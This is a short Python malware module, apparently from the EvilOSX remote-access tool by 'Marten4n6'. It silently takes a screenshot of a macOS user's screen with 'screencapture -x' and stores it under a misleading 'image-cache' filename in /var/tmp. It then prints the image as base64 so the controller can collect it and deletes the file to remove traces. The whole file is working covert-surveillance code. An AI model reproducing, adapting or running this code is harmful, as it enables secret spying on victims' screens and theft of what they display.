# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

import subprocess
import time

OUTPUT_FILE = "/var/tmp/image-cache.png"


def run_command(command):
    out, err = subprocess.Popen(
        command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    ).communicate()
    data = out + err
    if isinstance(data, bytes):
        return data.decode("utf-8", errors="replace")
    return data


def run(options):
    delay = 0
    fmt = "png"
    if isinstance(options, dict):
        try:
            delay = int(options.get("delay", 0) or 0)
        except (TypeError, ValueError):
            delay = 0
        ro = options.get("response_options") or {}
        name = str(ro.get("output_name", "")).lower()
        if name.endswith(".jpg") or name.endswith(".jpeg"):
            fmt = "jpg"
    if delay > 0:
        time.sleep(delay)
    out_file = OUTPUT_FILE if fmt == "png" else "/var/tmp/image-cache.jpg"
    tflag = "jpg" if fmt == "jpg" else "png"
    run_command("screencapture -x -t %s %s" % (tflag, out_file))
    b64 = "".join(run_command("base64 %s" % out_file).split())
    print(b64)
    run_command("rm -rf %s" % out_file)
